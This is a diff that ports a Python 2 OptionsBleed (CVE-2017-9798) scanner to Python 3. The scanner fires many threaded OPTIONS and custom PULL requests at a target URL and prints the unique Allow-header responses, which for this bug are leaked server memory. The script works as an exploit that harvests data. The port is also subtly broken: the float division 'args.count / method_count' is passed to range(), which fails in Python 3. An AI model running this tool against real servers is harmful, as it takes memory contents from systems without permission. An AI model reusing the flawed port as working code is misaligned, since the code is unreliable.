@@ -28,28 +28,28 @@ if not args.no_ignore:
 def does_it_bleed(url, method, verify=True):
     header = {'user-agent': 'Mozilla'}
     r = ''
-    print '[+] checking {0} method'.format(method.upper())
+    print('[+] checking {0} method'.format(method.upper()))
     try:
         if method == 'option':
             r = requests.options(url, headers=header, verify=verify, timeout=5)
         elif method == 'custom':
             r = requests.request('PULL', url, headers=header, verify=verify, timeout=5)
         else:
-            print '[!] invalid method!'
+            print('[!] invalid method!')
             return False
     except requests.exceptions.ConnectionError:
-        print '[!] connection error!'
+        print('[!] connection error!')
         return False
     except requests.exceptions.ReadTimeout:
-        print '[!] connection timed out!'
+        print('[!] connection timed out!')
         return False
     # TODO: SSL verify exception
-    low_headers = map(lambda x: x.lower(), r.headers.keys())
+    low_headers = [header.lower() for header in r.headers.keys()]
     if args.verbose:
-        print '[*] VERBOSE: \n\t-raw {0} headers: \n\t{1} \n\t-low {0} headers: \n\t{2}'.format(
-            method.upper(), ' '.join(r.headers.keys()), ' '.join(low_headers))
+        print('[*] VERBOSE: \n\t-raw {0} headers: \n\t{1} \n\t-low {0} headers: \n\t{2}'.format(
+            method.upper(), ' '.join(r.headers.keys()), ' '.join(low_headers)))
     if 'allow' in low_headers:
-        print '[+] allow headers detected in {0} response'.format(method.upper())
+        print('[+] allow headers detected in {0} response'.format(method.upper()))
         return True
 
 
@@ -67,7 +67,7 @@ def bleed(url, method='option', verify=True):
 
 
 def hemorrhage(count, bleed_method, thread_count=None):
-    for i in xrange(count):
+    for i in range(count):
         t = Thread(target=bleed, args=(args.url, bleed_method, not args.no_verify))
         threads.append(t)
         t.start()
@@ -76,14 +76,14 @@ def hemorrhage(count, bleed_method, thread_count=None):
 
 
 def main():
-    print '\n\t::OptionsBleed (CVE-2017-9798) Scanner::\n'
-    print '[+] scanning {} to see if it bleeds!'.format(args.url)
+    print('\n\t::OptionsBleed (CVE-2017-9798) Scanner::\n')
+    print('[+] scanning {} to see if it bleeds!'.format(args.url))
 
     if args.force:
         if does_it_bleed(args.url, args.force):
             hemorrhage(args.count, args.force)
         else:
-            print '[+] allow header NOT detected'
+            print('[+] allow header NOT detected')
             exit(1)
     else:
         options_test = does_it_bleed(args.url, 'option')
@@ -92,21 +92,21 @@ def main():
         if options_test and custom_test:
             method_count = 2
         if options_test:
-            print '[+] scanning with OPTIONS method...'
+            print('[+] scanning with OPTIONS method...')
             hemorrhage(args.count / method_count, 'option')
         if custom_test:
-            print '[+] scanning with custom (PULL) method...'
+            print('[+] scanning with custom (PULL) method...')
             hemorrhage(args.count / method_count, 'custom')
         if not options_test and not custom_test:
-            print '[+] allow header NOT detected'
+            print('[+] allow header NOT detected')
             exit(1)
 
-    print '[+] {0} responses captured'.format(len(results))
-    print '[+] unique results: \n{0}'.format('\n'.join(list(set(results))))
+    print('[+] {0} responses captured'.format(len(results)))
+    print('[+] unique results: \n{0}'.format('\n'.join(list(set(results)))))
     if args.errors:
-        print '[+] {0} errors captured'.format(len(errors))
-        print '[+] unique errors:\n{0}'.format('\n'.join(list(set(errors))))
-    print '[+] scan complete!'
+        print('[+] {0} errors captured'.format(len(errors)))
+        print('[+] unique errors:\n{0}'.format('\n'.join(list(set(errors)))))
+    print('[+] scan complete!')
 
 
 if __name__ == '__main__':
